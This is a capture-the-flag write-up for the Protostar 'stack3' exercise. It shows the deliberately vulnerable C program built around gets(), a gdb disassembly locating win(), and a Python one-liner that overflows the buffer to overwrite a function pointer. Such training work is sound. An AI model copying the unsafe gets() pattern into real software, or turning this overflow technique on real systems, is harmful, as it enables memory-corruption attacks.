# Stack3

## Description

Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)

This level is at `/opt/protostar/bin/stack3`

### Hint

- both gdb and objdump is your friend you determining where the win() function lies in memory.

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

## Approach

We know that `gets()` is the vulnerability function. As mentioned in the description a function `win()` is defined. But never been called in `main()`. So, It might be a return pointer. By using GDB, Get the address of `win()` function.

```bash
(gdb) disassemble win
Dump of assembler code for function win:
0x08048424 <win+0>:     push   ebp
0x08048425 <win+1>:     mov    ebp,esp
0x08048427 <win+3>:     sub    esp,0x18
0x0804842a <win+6>:     mov    DWORD PTR [esp],0x8048540
0x08048431 <win+13>:    call   0x8048360 <puts@plt>
0x08048436 <win+18>:    leave
0x08048437 <win+19>:    ret
End of assembler dump.
```

## Exploitation

Make payload and Exploit.

```bash
python -c 'import struct; print "A"*64+struct.pack("I",0x08048424)' | ./stack3
```
